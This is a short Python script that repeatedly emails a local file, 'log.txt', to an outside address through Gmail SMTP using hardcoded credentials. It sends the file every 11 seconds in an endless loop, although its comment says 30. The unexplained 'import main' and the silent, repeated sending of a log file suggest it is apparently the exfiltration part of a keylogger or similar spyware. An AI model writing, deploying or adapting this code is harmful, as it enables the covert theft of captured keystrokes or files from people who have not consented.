import main
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time

# Email configuration
sender_email = 'sender@gmail.com'
sender_password = 'P@$$w0rd'
receiver_email = 'receiver@ipniel.com'
subject = 'Email with Attachment'
body = 'Please find the attached file.'

# File to be attached
attachment_filename = 'log.txt'
attachment_location = 'C:/........../log.txt'

while True:
    # Create a MIME object to represent the email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Attach the file to the email
    attachment = open(attachment_location, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {attachment_filename}')
    msg.attach(part)

    # Create a secure SMTP connection to the email server (Gmail in this example)
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)

        # Send the email
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print('Email sent successfully!')
    except Exception as e:
        print(f'An error occurred: {str(e)}')
    finally:
        server.quit()

    # Wait for 30 seconds before sending the next email
    time.sleep(11)
